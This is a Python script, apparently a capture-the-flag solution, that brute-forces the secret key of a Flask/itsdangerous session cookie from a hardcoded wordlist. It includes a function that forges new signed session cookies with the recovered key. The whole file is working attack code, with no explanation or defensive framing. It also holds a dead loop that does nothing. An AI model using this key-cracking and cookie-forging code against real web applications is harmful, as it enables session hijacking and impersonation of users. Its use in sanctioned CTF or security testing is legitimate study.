import hashlib, hmac, base64, itertools, sys, re

# session: payload.timestamp.signature  (itsdangerous URLSafeTimedSerializer, salt=cookie-session)
PAYLOAD = "eyJ1c2VybmFtZSI6InM4MjExOCJ9"
TS = "at68Zw"
SIG = "_7CwGvdEDmOjuHZesJX09IqGBDU"


def b64e(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def sign(data, key, salt=b"cookie-session"):
    return b64e(hmac.new(key, salt + b"." + data, hashlib.sha1).digest())


TARGET = PAYLOAD + "." + TS
WORDS = """secret admin password 123456 root test guest demo flag htu htuctf HTUCTF
goldcoin bank gold coin night 夜班 柜员 goldcoinbank gold_coin_bank supersecret
supersecretkey thisisasecretkey this_is_a_secret_key secretkey secret_key
changeme password123 abc123 111111 000000 qwerty letmein welcome iloveyou
s3cr3t mysecret my_secret_key app appkey key flask flask_secret dev development
production prod ctf CTF challenge bank_secret vault obsidian star 星火 xinghuo
星星 spark sparksbank random unknown please_change_me insecure default
""".split()

EXTRA = []
for a in ("secret", "key", "admin", "bank", "gold", "flask", "htu", "ctf"):
    for b in ("", "key", "123", "2024", "2025", "2026", "_key", "key123"):
        EXTRA.append(a + b)
for n in range(100000):
    pass

cands = []
seen = set()
for w in WORDS + EXTRA:
    if w in seen:
        continue
    seen.add(w)
    cands.append(w)
    cands.append(w.upper())
    cands.append(w.capitalize())

print("trying", len(cands))
for k in cands:
    if sign(TARGET.encode(), k.encode()) == SIG:
        print("FOUND KEY:", repr(k))
        sys.exit(0)
print("not found in wordlist")

# demo: show what we'd produce
def make(payload_obj, key):
    import json
    p = b64e(json.dumps(payload_obj, separators=(",", ":")).encode())
    ts = TS
    return p + "." + ts + "." + sign((p + "." + ts).encode(), key.encode())
